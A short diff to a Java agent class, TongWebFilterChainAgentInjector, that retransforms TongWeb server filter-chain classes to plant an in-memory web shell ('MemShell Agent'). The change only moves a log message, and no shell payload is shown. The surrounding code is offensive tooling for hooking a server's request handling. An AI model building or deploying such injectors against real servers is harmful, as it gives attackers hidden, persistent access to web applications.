@@ -45,7 +45,6 @@ public class TongWebFilterChainAgentInjector implements ClassFileTransformer {
             for (String targetClass : TARGET_CLASSES) {
                 if (targetClass.replace("/", ".").equals(name)) {
                     inst.retransformClasses(allLoadedClass);
-                    System.out.println("MemShell Agent is working at " + name + ".doFilter");
                 }
             }
         }
@@ -68,6 +67,7 @@ public class TongWebFilterChainAgentInjector implements ClassFileTransformer {
                     };
                     ClassVisitor cv = getClassVisitor(cw);
                     cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                    System.out.println("MemShell Agent is working at " + className.replace("/", ".") + "." + TARGET_METHOD_NAME);
                     return cw.toByteArray();
                 } catch (Exception e) {
                     e.printStackTrace();
